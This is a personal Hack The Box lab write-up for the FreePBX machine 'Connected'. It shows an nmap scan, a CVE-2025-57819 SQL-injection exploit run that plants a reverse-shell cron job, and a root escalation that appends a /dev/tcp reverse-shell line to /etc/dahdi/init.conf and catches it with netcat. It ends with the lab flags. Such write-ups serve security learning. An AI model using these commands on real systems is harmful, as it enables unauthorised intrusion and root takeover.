---
title: "Connected"
kind: writeup
tags:
  - hack-the-box-labs
  - status/done
  - writeup
  - linux
status: "Done"
difficulty: "Easy"
difficulty-for-me: "Medium"
date: 2026-06-08
url: "https://app.hackthebox.com/machines/Connected?sort_by=created_at&sort_type=desc"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: 379759b9275180a296a6d049e4ede724
---

# Connected

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```bash
                                                                                                                                                                                       
┌──(kali㉿kali)-[~/nmap]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.129.238.138
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 23:57 -0400
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.68% done; ETC: 23:59 (0:01:57 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.52% done; ETC: 23:59 (0:00:01 remaining)
Stats: 0:02:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.55% done; ETC: 23:59 (0:00:00 remaining)
Nmap scan report for connected.htb (10.129.238.138)
Host is up (1.1s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
80/tcp  open  tcpwrapped
443/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.33 seconds

```

## Recon

![[attachments/Hack The Box Labs/Hack The Box/Connected/image.png]]

![[attachments/Hack The Box Labs/Hack The Box/Connected/image 1.png]]

## User Flag

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CVEs/CVE-2025-57819-poc]
└─$ python3 exploit.py http://connected.htb --ip 10.10.16.6
[*] Listener address: 10.10.16.6:4444 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jkbthmng' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.238.138:49706 !
[+] Removed cron job 'jkbthmng' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                                                                                                                               
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                                                                                                                                
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                                                                                                                                
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                                                                                                                               
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                                                                                                                               
                                                                                                                                                                                             
                                                                                                                                                                                             
NOTICE! You have 3 notifications! Please log into the UI to see them!                                                                                                                        
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:7E:FF | 10.129.238.138            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

< 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || /bin/bash -i            
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                                                                                                                               
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                                                                                                                                
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                                                                                                                                
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                                                                                                                               
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                                                                                                                               
                                                                                                                                                                                             
                                                                                                                                                                                             
NOTICE! You have 3 notifications! Please log into the UI to see them!                                                                                                                        
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:7E:FF | 10.129.238.138            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ ls 
s
bash: s: command not found
[asterisk@connected ~]$ ls
ls
user.txt
[asterisk@connected ~]$cat user.txt
cat user.txt
69d9ae247f1dbcdd70f5204868082704

```

### Root Flag

```bash
[asterisk@connected asterisk]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.16.28/9001 0>&1" &' >> /etc/dahdi/init.conf   
01 0>&1" &' >> /etc/dahdi/init.conf10.10.16.28/90 
[asterisk@connected asterisk]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
di_restartart" > /var/spool/asterisk/sysadmin/dah 
[asterisk@connected asterisk]$ 

┌──(kali㉿kali)-[~/CVEs/CVE-2025-57819-poc]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.106.66] 33612
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:68:76 | 10.129.106.66             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[root@connected /]# whoami
whoami
root
[root@connected /]# cat /root/root.txt 
cat /root/root.txt
c571009da8add7bbe77c32cf16fbe490

```
